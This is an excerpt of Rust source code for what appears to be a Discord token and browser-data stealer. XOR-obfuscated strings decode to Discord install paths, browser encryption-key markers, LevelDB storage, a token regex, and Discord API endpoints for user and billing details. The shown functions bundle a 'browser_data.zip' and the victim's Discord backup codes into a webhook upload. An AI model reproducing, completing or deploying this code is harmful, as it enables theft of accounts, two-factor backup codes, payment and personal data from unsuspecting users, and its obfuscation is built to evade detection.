...
mod enc {
    ...
    const fn as_str<const N: usize>(encoded: [u8; N]) -> &'static str {
        const DECODED: [u8; N] = decode(encoded);
        unsafe { core::str::from_utf8_unchecked(&DECODED) }
    }

    const fn as_bytes<const N: usize>(encoded: [u8; N]) -> [u8; N] {
        decode(encoded)
    }

    pub const S_WEBHOOK: &str = as_str([0x6D, 0x3F, 0x3C, 0x3F, 0x3E, 0x2B, 0x2C, 0x2B, 0x3A, 0x3D, 0x2E, 0x2B, 0x2A, 0x2B, 0x3E, 0x2A, 0x2B, 0x3E, 0x2D, 0x2B, 0x3C, 0x3F, 0x3D, 0x2B, 0x2C, 0x2B, 0x2E, 0x3D, 0x3F, 0x3C, 0x3F, 0x3E, 0x3C, 0x3F, 0x3C, 0x3F, 0x3E, 0x3D, 0x3D, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F, 0x3C, 0x3D, 0x3E, 0x3F]);
    pub const S_APPDATA: &str = as_str([0x1B, 0x0A, 0x0A, 0x1E, 0x1B, 0x0E, 0x1B]);
    pub const S_DISCORD: &str = as_str([0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E]);
    pub const S_DISCORD_PTB: &str = as_str([0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x2A, 0x2E, 0x38]);
    pub const S_DISCORD_CANARY: &str = as_str([0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x39, 0x3B, 0x34, 0x3B, 0x28, 0x23]);
    pub const S_LOCAL_STATE: &str = as_str([0x16, 0x35, 0x39, 0x3B, 0x36, 0x7A, 0x09, 0x2E, 0x3B, 0x2E, 0x3F]);
    pub const S_OS_CRYPT: &str = as_str([0x35, 0x29, 0x05, 0x39, 0x28, 0x23, 0x2A, 0x2E]);
    pub const S_ENCRYPTED_KEY: &str = as_str([0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05, 0x31, 0x3F, 0x23]);
    pub const S_LEVELDB: &str = as_str([0x16, 0x35, 0x39, 0x3B, 0x36, 0x7A, 0x09, 0x2E, 0x35, 0x28, 0x3B, 0x3D, 0x3F, 0x75, 0x36, 0x3F, 0x2C, 0x3F, 0x36, 0x3E, 0x38]);
    pub const S_TOKEN_MARKER: &str = as_str([0x3E, 0x0B, 0x2D, 0x6E, 0x2D, 0x63, 0x0D, 0x3D, 0x02, 0x39, 0x0B, 0x60]);
    pub const S_USERS_ME: &str = as_str([0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x74, 0x39, 0x35, 0x37, 0x75, 0x3B, 0x2A, 0x33, 0x75, 0x2C, 0x63, 0x75, 0x2F, 0x29, 0x3F, 0x28, 0x29, 0x75, 0x1A, 0x37, 0x3F]);
    pub const S_BILLING: &str = as_str([0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x74, 0x39, 0x35, 0x37, 0x75, 0x3B, 0x2A, 0x33, 0x75, 0x2C, 0x63, 0x75, 0x2F, 0x29, 0x3F, 0x28, 0x29, 0x75, 0x1A, 0x37, 0x3F, 0x75, 0x38, 0x33, 0x36, 0x36, 0x33, 0x34, 0x3D, 0x75, 0x2A, 0x3B, 0x23, 0x37, 0x3F, 0x34, 0x2E, 0x77, 0x29, 0x35, 0x2F, 0x28, 0x39, 0x3F, 0x29]);
    pub const S_AUTH_HEADER: &str = as_str([0x1B, 0x2F, 0x2E, 0x32, 0x35, 0x28, 0x33, 0x20, 0x3B, 0x2E, 0x33, 0x35, 0x34]);
    pub const S_HDR_CONTENT_TYPE: &str = as_str([0x19, 0x35, 0x34, 0x2E, 0x3F, 0x34, 0x2E, 0x77, 0x0E, 0x23, 0x2A, 0x3F]);
    pub const S_CONTENT_TYPE: &str = as_str([0x3B, 0x2A, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x75, 0x30, 0x29, 0x35, 0x34]);
    pub const S_HDR_USER_AGENT: &str = as_str([0x0F, 0x29, 0x3F, 0x28, 0x77, 0x1B, 0x3D, 0x3F, 0x34, 0x2E]);
    pub const S_USER_AGENT: &str = as_str([0x17, 0x35, 0x20, 0x33, 0x36, 0x36, 0x3B, 0x75, 0x6F, 0x74, 0x6A, 0x7A, 0x72, 0x0D, 0x33, 0x34, 0x3E, 0x35, 0x2D, 0x29, 0x7A, 0x14, 0x0E, 0x7A, 0x6B, 0x6A, 0x74, 0x6A, 0x61, 0x7A, 0x0D, 0x33, 0x34, 0x6C, 0x6E, 0x61, 0x7A, 0x22, 0x6C, 0x6E, 0x73, 0x7A, 0x1B, 0x2A, 0x2A, 0x36, 0x3F, 0x0D, 0x3F, 0x38, 0x11, 0x33, 0x2E, 0x75, 0x6F, 0x69, 0x6D, 0x74, 0x69, 0x6C]);
    pub const S_AVATAR_URL_FMT: &str = as_str([0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x39, 0x3E, 0x34, 0x74, 0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x3B, 0x2A, 0x2A, 0x74, 0x39, 0x35, 0x37, 0x75, 0x3B, 0x2C, 0x3B, 0x2E, 0x3B, 0x28, 0x29, 0x75, 0x21, 0x27, 0x75, 0x21, 0x27, 0x74, 0x2A, 0x34, 0x3D]);
    pub const S_DEFAULT_AVATAR_URL: &str = as_str([0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x39, 0x3E, 0x34, 0x74, 0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x3B, 0x2A, 0x2A, 0x74, 0x39, 0x35, 0x37, 0x75, 0x3F, 0x37, 0x38, 0x3F, 0x3E, 0x75, 0x3B, 0x2C, 0x3B, 0x2E, 0x3B, 0x28, 0x29, 0x75, 0x6A, 0x74, 0x2A, 0x34, 0x3D]);
    pub const S_NO_BILLING: &str = as_str([0x14, 0x35, 0x7A, 0x38, 0x33, 0x36, 0x36, 0x33, 0x34, 0x3D]);
    pub const S_NO_BILLING_INFO: &str = as_str([0x14, 0x35, 0x7A, 0x38, 0x33, 0x36, 0x36, 0x33, 0x34, 0x3D, 0x7A, 0x33, 0x34, 0x3C, 0x35, 0x28, 0x37, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x7A, 0x3C, 0x35, 0x2F, 0x34, 0x3E]);
    pub const S_PAYPAL_LBL: &str = as_str([0x0A, 0x3B, 0x23, 0x0A, 0x3B, 0x36, 0x60, 0x7A]);
    pub const S_CARDS_LBL: &str = as_str([0x19, 0x3B, 0x28, 0x3E, 0x29, 0x60, 0x7A]);
    pub const S_ENABLED: &str = as_str([0x1F, 0x34, 0x3B, 0x38, 0x36, 0x3F, 0x3E]);
    pub const S_DISABLED: &str = as_str([0x1E, 0x33, 0x29, 0x3B, 0x38, 0x36, 0x3F, 0x3E]);
    pub const S_NA: &str = as_str([0x14, 0x75, 0x1B]);
    pub const S_JSON_ID: &str = as_str([0x33, 0x3E]);
    pub const S_JSON_USERNAME: &str = as_str([0x2F, 0x29, 0x3F, 0x28, 0x34, 0x3B, 0x37, 0x3F]);
    pub const S_JSON_DISCRIMINATOR: &str = as_str([0x3E, 0x33, 0x29, 0x39, 0x28, 0x33, 0x37, 0x33, 0x34, 0x3B, 0x2E, 0x35, 0x28]);
    pub const S_JSON_AVATAR: &str = as_str([0x3B, 0x2C, 0x3B, 0x2E, 0x3B, 0x28]);
    pub const S_JSON_PUBLIC_FLAGS: &str = as_str([0x2A, 0x2F, 0x38, 0x36, 0x33, 0x39, 0x05, 0x3C, 0x36, 0x3B, 0x3D, 0x29]);
    pub const S_JSON_EMAIL: &str = as_str([0x3F, 0x37, 0x3B, 0x33, 0x36]);
    pub const S_JSON_PHONE: &str = as_str([0x2A, 0x32, 0x35, 0x34, 0x3F]);
    pub const S_JSON_MFA_ENABLED: &str = as_str([0x37, 0x3C, 0x3B, 0x05, 0x3F, 0x34, 0x3B, 0x38, 0x36, 0x3F, 0x3E]);
    pub const S_JSON_LAST_4: &str = as_str([0x36, 0x3B, 0x29, 0x2E, 0x05, 0x6E]);
    pub const S_JSON_BRAND: &str = as_str([0x38, 0x28, 0x3B, 0x34, 0x3E]);
    pub const S_ATTACHMENTS: &str = as_str([0x3B, 0x2E, 0x2E, 0x3B, 0x39, 0x32, 0x37, 0x3F, 0x34, 0x2E, 0x29]);
    pub const S_FILES_PREFIX: &str = as_str([0x3C, 0x33, 0x36, 0x3F, 0x29, 0x01]);
    pub const S_FILES_SUFFIX: &str = as_str([0x07]);
    pub const S_JSON_FILENAME: &str = as_str([0x3C, 0x33, 0x36, 0x3F, 0x34, 0x3B, 0x37, 0x3F]);
    pub const S_BACKUP_ATTACHED: &str = as_str([0xB8, 0xC6, 0xDF, 0x7A, 0x1B, 0x2E, 0x2E, 0x3B, 0x39, 0x32, 0x3F, 0x3E, 0x7A, 0x3B, 0x29, 0x7A, 0x3C, 0x33, 0x36, 0x3F]);
    pub const S_DPAPI_PREFIX: [u8; 5] = as_bytes([0x1E, 0x0A, 0x1B, 0x0A, 0x13]);
    pub const S_V10: [u8; 3] = as_bytes([0x2C, 0x6B, 0x6A]);
    pub const S_V11: [u8; 3] = as_bytes([0x2C, 0x6B, 0x6B]);
    pub const S_V20: [u8; 3] = as_bytes([0x2C, 0x68, 0x6A]);
    pub const S_TOKEN_REGEX: &str = as_str([0x3E, 0x0B, 0x2D, 0x6E, 0x2D, 0x63, 0x0D, 0x3D, 0x02, 0x39, 0x0B, 0x60, 0x01, 0x04, 0x78, 0x07, 0x71]);
    pub const S_USERPROFILE: &str = as_str([0x0F, 0x09, 0x1F, 0x08, 0x0A, 0x08, 0x15, 0x1C, 0x13, 0x16, 0x1F]);
    pub const S_DOCUMENTS: &str = as_str([0x1E, 0x35, 0x39, 0x2F, 0x37, 0x3F, 0x34, 0x2E, 0x29]);
    pub const S_DOWNLOADS: &str = as_str([0x1E, 0x35, 0x2D, 0x34, 0x36, 0x35, 0x3B, 0x3E, 0x29]);
    pub const S_DESKTOP: &str = as_str([0x1E, 0x3F, 0x29, 0x31, 0x2E, 0x35, 0x2A]);
    pub const S_BACKUP_FILENAME: &str = as_str([0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x05, 0x38, 0x3B, 0x39, 0x31, 0x2F, 0x2A, 0x05, 0x39, 0x35, 0x3E, 0x3F, 0x29, 0x74, 0x2E, 0x22, 0x2E]);
    pub const S_BACKUP_BASE: &str = as_str([0x3E, 0x33, 0x29, 0x39, 0x35, 0x28, 0x3E, 0x05, 0x38, 0x3B, 0x39, 0x31, 0x2F, 0x2A, 0x05, 0x39, 0x35, 0x3E, 0x3F, 0x29]);
    pub const S_PAREN_SPACE: &str = as_str([0x7A, 0x72]);
    pub const S_DOT_TXT: &str = as_str([0x74, 0x2E, 0x22, 0x2E]);
    pub const S_ZIP_FILENAME: &str = as_str([0x38, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x05, 0x3E, 0x3B, 0x2E, 0x3B, 0x74, 0x20, 0x33, 0x2A]);
    pub const S_APPLICATION_ZIP: &str = as_str([0x3B, 0x2A, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x75, 0x20, 0x33, 0x2A]);
    pub const S_PAYLOAD_JSON: &str = as_str([0x2A, 0x3B, 0x23, 0x36, 0x35, 0x3B, 0x3E, 0x05, 0x30, 0x29, 0x35, 0x34]);
    pub const S_TEXT_PLAIN: &str = as_str([0x2E, 0x3F, 0x22, 0x2E, 0x75, 0x2A, 0x36, 0x3B, 0x33, 0x34]);
}
...
async fn send_webhook_message(
    ...
    if let Some(zip) = zip_data {
        ...
        entry.insert(enc::S_JSON_ID, json!(idx));
        entry.insert(enc::S_JSON_FILENAME, json!(enc::S_ZIP_FILENAME));
        attachment_meta.push(Value::Object(entry));
        attachments.push(AttachmentSpec {
            field: files_part_name(idx),
            filename: enc::S_ZIP_FILENAME,
            mime: enc::S_APPLICATION_ZIP,
            data: zip,
        });
        idx += 1;
    }
    ...
    if let Some(path) = backup_codes_path {
        if let Ok(data) = browsers::read_bytes_with_retry(Path::new(path)) {
            let mut entry = serde_json::Map::new();
            entry.insert(enc::S_JSON_ID, json!(idx));
            entry.insert(enc::S_JSON_FILENAME, json!(enc::S_BACKUP_FILENAME));
            attachment_meta.push(Value::Object(entry));
            attachments.push(AttachmentSpec {
                field: files_part_name(idx),
                filename: enc::S_BACKUP_FILENAME,
                mime: enc::S_TEXT_PLAIN,
                data,
            });
        }
    }
    ...
    if let Some(obj) = payload.as_object_mut() {
        obj.insert(enc::S_ATTACHMENTS, json!(attachment_meta));
    }
...
fn get_discord_paths() -> HashMap<String, PathBuf> {
    ...
    paths.insert(enc::S_DISCORD, roaming.join(enc::S_DISCORD));
    paths.insert(enc::S_DISCORD_PTB, roaming.join(enc::S_DISCORD_PTB));
    paths.insert(enc::S_DISCORD_CANARY, roaming.join(enc::S_DISCORD_CANARY));
    paths
}
